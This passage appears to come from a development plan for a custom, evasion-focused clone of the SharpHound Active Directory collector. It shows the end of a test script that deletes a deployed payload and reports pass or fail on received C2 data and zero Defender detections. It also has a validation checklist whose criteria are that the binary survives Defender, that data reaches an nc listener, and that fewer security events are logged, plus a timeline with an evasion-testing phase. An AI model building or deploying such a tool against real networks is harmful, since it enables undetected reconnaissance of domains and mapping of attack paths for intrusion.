# Cleanup
eval $SSH "'del C:\\Users\\$VM_USER\\Desktop\\payload.exe 2>NUL'" 2>/dev/null

# Summary
echo ""
echo "══════════════════════════════════════"
if [ "$SIZE" -gt 100 ] && [ "${DETECTIONS:-0}" = "0" ] && [ "$BH_RESULT" = "0" ]; then
    echo "  RESULT: PASS"
    echo "  Output: $OUTFILE"
    echo "  Import: Upload to BloodHound CE for graph analysis"
else
    echo "  RESULT: FAIL"
    [ "$SIZE" -lt 100 ] && echo "  - No C2 data received"
    [ "${DETECTIONS:-0}" != "0" ] && echo "  - Defender detected ($DETECTIONS alerts)"
    [ "$BH_RESULT" != "0" ] && echo "  - JSON validation failed"
fi
echo "══════════════════════════════════════"
```

---

## 7. Validation Checklist

For each recipe, all must pass:

| Check | Method | Pass Criteria |
|-------|--------|---------------|
| Assembles | `assembler.py recipe.yaml -o /tmp/out.c` | Exits 0, no missing chunks |
| Compiles | `--compile` flag | MinGW exits 0, binary produced |
| Survives Defender | Upload + wait 5s + check exists | Binary still on disk |
| Executes | Run on domain-joined VM | Process completes, no crash |
| C2 data received | nc listener captures data | > 100 bytes received |
| Valid ZIP | unzip -t | Valid ZIP archive |
| Valid JSON schema | validate_bloodhound.py | All entity types present, v6 format |
| Entity counts match | Compare with SharpHound baseline | Within 5% of baseline per type |
| BloodHound import | Upload to BH CE | No import errors |
| Attack paths exist | Query known paths | jsmith→DA path found |
| Zero Defender detections | Get-MpThreatDetection | 0 new detections |
| Event count reduction | Compare 4662/5145 counts | <= 50% of SharpHound event count |

---

## 8. Timeline

| Phase | Task | Estimated Hours |
|-------|------|-----------------|
| 1 | VM AD setup (promote DC + populate) | 2 |
| 2 | SharpHound baseline capture | 1 |
| 3 | Core infrastructure chunks (ldap_client, json_builder, sid_resolver) | 8 |
| 4 | First collector + arch template (ad_domains — simplest) | 4 |
| 5 | End-to-end pipeline test (assemble → compile → deploy → capture) | 2 |
| 6 | Remaining LDAP collectors (users, groups, computers, OUs, GPOs) | 12 |
| 7 | ACL parser + ad_acls collector | 6 |
| 8 | DCOnly recipe fully working + validated | 2 |
| 9 | SAMR client + localgroups + sessions collectors | 8 |
| 10 | Default/Full recipes working + validated | 4 |
| 11 | ADCS collector | 4 |
| 12 | Evasion testing + detection comparison | 4 |
| 13 | BloodHound import + attack path validation | 2 |
| **Total** | | **~59 hours** |

### MVP (DCOnly recipe — LDAP only): ~19 hours (phases 1-8)
### Full feature parity: ~59 hours (all phases)
